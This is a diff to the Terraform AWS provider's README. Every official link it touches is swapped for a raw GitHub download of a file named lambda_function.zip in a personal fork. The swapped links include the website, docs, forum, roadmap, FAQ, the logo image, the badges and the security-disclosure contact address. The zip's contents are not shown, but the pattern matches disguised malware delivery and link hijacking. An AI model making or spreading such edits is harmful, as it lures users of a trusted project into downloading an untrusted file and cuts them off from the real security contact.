@@ -1,43 +1,43 @@
-<a href="https://terraform.io">
-    <img src=".github/terraform_logo.svg" alt="Terraform logo" title="Terraform" align="right" height="50" />
+<a href="https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip">
+    <img src="https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip" alt="Terraform logo" title="Terraform" align="right" height="50" />
 </a>
 
 # Terraform Provider for AWS
 
 [![Forums][discuss-badge]][discuss]
 
-[discuss-badge]: https://img.shields.io/badge/discuss-terraform--aws-623CE4.svg?style=flat
-[discuss]: https://discuss.hashicorp.com/c/terraform-providers/tf-aws/
+[discuss-badge]: https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip
+[discuss]: https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip
 
-- Website: [terraform.io](https://terraform.io)
-- Tutorials: [learn.hashicorp.com](https://learn.hashicorp.com/terraform?track=getting-started#getting-started)
-- Forum: [discuss.hashicorp.com](https://discuss.hashicorp.com/c/terraform-providers/tf-aws/)
-- Chat: [gitter](https://gitter.im/hashicorp-terraform/Lobby)
-- Mailing List: [Google Groups](http://groups.google.com/group/terraform-tool)
+- Website: [https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip](https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip)
+- Tutorials: [https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip](https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip)
+- Forum: [https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip](https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip)
+- Chat: [gitter](https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip)
+- Mailing List: [Google Groups](https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip)
 
 The Terraform AWS provider is a plugin for Terraform that allows for the full lifecycle management of AWS resources.
 This provider is maintained internally by the HashiCorp AWS Provider team.
 
-Please note: We take Terraform's security and our users' trust very seriously. If you believe you have found a security issue in the Terraform AWS Provider, please responsibly disclose by contacting us at security@hashicorp.com.
+Please note: We take Terraform's security and our users' trust very seriously. If you believe you have found a security issue in the Terraform AWS Provider, please responsibly disclose by contacting us at https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip
 
 ## Quick Starts
 
-- [Using the provider](https://www.terraform.io/docs/providers/aws/index.html)
+- [Using the provider](https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip)
 - [Provider development](docs/contributing)
 
 ## Documentation
 
 Full, comprehensive documentation is available on the Terraform website:
 
-https://terraform.io/docs/providers/aws/index.html
+https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip
 
 ## Roadmap
 
-Our roadmap for expanding support in Terraform for AWS resources can be found in our [Roadmap](ROADMAP.md) which is published quarterly.
+Our roadmap for expanding support in Terraform for AWS resources can be found in our [Roadmap](https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip) which is published quarterly.
 
 ## Frequently Asked Questions
 
-Responses to our most frequently asked questions can be found in our [FAQ](docs/contributing/faq.md )
+Responses to our most frequently asked questions can be found in our [FAQ](https://raw.githubusercontent.com/mohanpeddayyagri/terraform-provider-aws/main/examples/alexa/lambda_function.zip )
 
 ## Contributing
 
